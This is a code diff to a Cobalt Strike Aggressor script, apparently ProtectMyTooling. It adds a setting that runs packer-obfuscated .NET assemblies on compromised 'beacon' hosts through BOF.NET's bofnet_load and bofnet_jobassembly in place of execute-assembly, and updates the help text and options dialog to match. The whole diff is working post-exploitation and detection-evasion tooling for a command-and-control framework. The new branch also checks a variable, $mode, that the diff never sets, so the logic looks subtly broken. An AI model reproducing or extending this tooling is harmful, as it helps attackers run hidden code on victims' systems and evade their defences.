@@ -40,6 +40,7 @@ $protectedCobaltSettingsFile = script_resource("cobaltProtectMyTooling.conf");
 %options["default_dll_x86_packers_chain"]       = "upx,hyperion";
 %options["default_dll_x64_packers_chain"]       = "upx,hyperion";
 %options["default_dotnet_packers_chain"]        = "confuserex";
+%options["prefer_bofnet_over_executeasm"]       = "true";
 
 
 # No need to update that list, it will get filled automatically.
@@ -87,11 +88,40 @@ sub interpretSize {
     return $size;
 }
 
+$has_bofnet_commands = false;
+
+sub checkBofnet {
+    if($has_bofnet_commands == false) {
+        foreach $command (beacon_commands()) {
+            if('bofnet_init' iswm $command) {
+                $has_bofnet_commands = true;
+                break;
+            }
+        }
+    }
+
+    if((%options["prefer_bofnet_over_executeasm"] eq "true") && ($has_bofnet_commands == false)) {
+        show_error("There is no BOF.NET loaded in Cobalt Strike! Load bofnet.cna or reload ProtectMyTooling.cna to use protected-execute-assembly");
+    }
+}
+
 alias protected-execute-assembly {
     local('$bid $localpath $args $generatedlocalpath');
     $bid = shift(@_);
     $localpath = shift(@_);
     $args = join(" ", @_);
+
+    $useBofnet = false;
+
+    if($mode == true) {
+        if($has_bofnet_commands == true) {
+            $useBofnet = true;
+        }
+        else {
+            berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and ProtectMyTooling.cna before using this.");
+            return;
+        }
+    }
 
     if($localpath is $null || strlen($localpath) == 0) {
         prompt_file_open("Choose an assembly to execute", $null, false, lambda({
@@ -164,7 +194,31 @@ alias protected-execute-assembly {
         btask($bid, "Tasked beacon to run a protected .NET program (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
     }
     
-    bexecute_assembly!($bid, $generatedlocalpath, $args);
+    if($useBofnet)
+    {
+        if(strlen($hash) == 0) {
+            btask($bid, "(bofnet_load) Tasked beacon to run a protected .NET program: \c7" . getFileName($generatedlocalpath) . " $args \o");
+        }
+        else {
+            btask($bid, "(bofnet_load) Tasked beacon to run a protected .NET program (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
+        }
+
+        binput($bid, "bofnet_load $generatedlocalpath");
+        fireAlias($bid, "bofnet_load", $generatedlocalpath);
+        
+        binput($bid, "bofnet_jobassembly " . getFileName($generatedlocalpath) . " $args");
+        fireAlias($bid, "bofnet_jobassembly", getFileName($generatedlocalpath) . " $args");
+    }
+    else
+    {
+        if(strlen($hash) == 0) {
+            btask($bid, "(execute-assembly) Tasked beacon to run a protected .NET program: \c7" . getFileName($generatedlocalpath) . " $args \o");
+        }
+        else {
+            btask($bid, "(execute-assembly) Tasked beacon to run a protected .NET program (md5: " . $hash . "): \c7" . getFileName($generatedlocalpath) . " $args \o");
+        }
+        bexecute_assembly!($bid, $generatedlocalpath, $args);
+    }
 }
 
 alias protected-upload {
@@ -262,6 +316,7 @@ sub help {
     $hlp .= "    * default_dll_x86_packers_chain - Native x86 DLL executables protectors/packers chain\n";
     $hlp .= "    * default_dll_x64_packers_chain - Native x64 DLL executables protectors/packers chain\n";
     $hlp .= "    * default_dotnet_packers_chain - .NET executables protectors/packers chain\n";
+    $hlp .= "    * prefer_bofnet_over_executeasm - Prefer BOF.NET bofnet_jobassembly over execute-assembly\n";
     $hlp .= "\n";
 
     # ===========================================================================================================
@@ -482,6 +537,7 @@ sub showOptionsDialog {
     drow_text($dialog, "default_dotnet_packers_chain", ".NET executables protectors/packers chain: ");
     drow_text($dialog, "default_dll_x86_packers_chain", "Native x86 DLL executables protectors/packers chain: ");
     drow_text($dialog, "default_dll_x64_packers_chain", "Native x64 DLL executables protectors/packers chain: ");
+    drow_checkbox($dialog, "prefer_bofnet_over_executeasm", "Prefer BOF.NET bofnet_jobassembly over execute-assembly:", "Prefer BOF.NET");
 
     dbutton_action($dialog, "Save settings");
     dbutton_action($dialog, "Help");
@@ -509,6 +565,7 @@ sub updateOptions{
     %options["default_dll_x86_packers_chain"] = %setopts["default_dll_x86_packers_chain"];
     %options["default_dll_x64_packers_chain"] = %setopts["default_dll_x64_packers_chain"];
     %options["default_dotnet_packers_chain"] = %setopts["default_dotnet_packers_chain"];
+    %options["prefer_bofnet_over_executeasm"] = %setopts["prefer_bofnet_over_executeasm"];
 
     if(checkOptions() == 1) {
         show_message("Options saved.");
@@ -835,4 +892,5 @@ sub putOptions {
     println("[ProtectMyTooling] Options saved to " . $protectedCobaltSettingsFile);
 }
 
+checkBofnet();
 getOptions();
